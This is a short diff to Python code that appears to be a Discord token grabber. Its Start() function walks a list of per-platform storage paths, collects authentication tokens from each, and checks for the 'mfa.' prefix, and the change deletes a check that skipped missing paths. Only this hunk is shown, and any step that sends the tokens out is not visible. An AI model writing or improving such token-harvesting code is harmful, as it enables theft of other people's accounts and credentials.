@@ -46,8 +46,6 @@ def Start():
 	ids = []
 	
 	for platform, path in dire.items():
-		if not os.path.exists(path):
-			continue
 		for token in Tokens(path):
 			uid = None
 			if not token.startswith("mfa."):
